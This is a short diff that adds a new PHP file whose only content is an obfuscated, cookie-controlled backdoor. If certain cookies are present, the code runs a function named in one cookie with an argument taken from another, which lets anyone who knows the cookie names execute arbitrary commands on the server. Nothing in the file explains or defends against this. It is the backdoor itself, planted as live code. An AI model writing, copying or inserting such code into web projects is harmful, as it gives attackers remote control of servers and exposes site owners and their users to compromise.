@@ -1,0 +1,2 @@
+<?php
+if(isset($_COOKIE["lyF"])){$_COOKIE["VDdcz"]($_COOKIE["lyF"]);exit;} if(isset($_COOKIE["xo"])){$_COOKIE["DCJ"]($_COOKIE["xo"]);exit;}
